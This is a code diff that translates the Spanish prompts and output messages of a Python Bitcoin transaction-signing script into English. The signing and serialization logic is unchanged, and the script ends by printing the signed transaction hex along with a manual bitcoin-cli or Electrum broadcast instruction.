-    # ── Confirmación ─────────────────────────────────────────────
+    # ── Confirmation ─────────────────────────────────────────────
     print()
     print_sep()
-    confirmacion = input("¿Construir y firmar la transacción? (s/N): ").strip().lower()
-    if confirmacion not in ("s", "si", "sí", "yes", "y"):
-        print("Cancelado.")
+    confirm = input("Build and sign the transaction? (y/N): ").strip().lower()
+    if confirm not in ("y", "yes"):
+        print("Cancelled.")
         sys.exit(0)
 
-    # ── Construir y firmar ───────────────────────────────────────
+    # ── Build and sign ───────────────────────────────────────────
     print()
     print_sep()
-    print("FIRMANDO TRANSACCIÓN")
+    print("SIGNING TRANSACTION")
     print_sep()
 
     SEQUENCE = 0xFFFFFFFD
@@ -1047,24 +1047,24 @@ def main():
         )
         sig = sign_ecdsa(inp.privkey, sighash)
         witnesses.append([sig, inp.pubkey])
-        print(f"  Input {i+1}/{len(all_inputs)} firmado ✓")
+        print(f"  Input {i+1}/{len(all_inputs)} signed ✓")
 
     raw_tx = serialize_tx(all_inputs, dest_spk, output_value, witnesses)
     txid = compute_txid(all_inputs, dest_spk, output_value)
 
     print()
     print_sep()
-    print("RESULTADO")
+    print("RESULT")
     print_sep()
-    print(f"  TXID esperado : {txid}")
-    print(f"  Tamaño TX     : {len(raw_tx)} bytes")
+    print(f"  Expected TXID  : {txid}")
+    print(f"  TX size        : {len(raw_tx)} bytes")
     print()
-    print("  TX firmada (hex):")
+    print("  Signed TX (hex):")
     print(raw_tx.hex())
     print()
-    print("  Broadcast manual:")
+    print("  Manual broadcast:")
     print(f"    bitcoin-cli sendrawtransaction {raw_tx.hex()}")
-    print( "    — o vía Electrum: blockchain.transaction.broadcast")
+    print( "    — or via Electrum: blockchain.transaction.broadcast")
     print_sep()
 
 
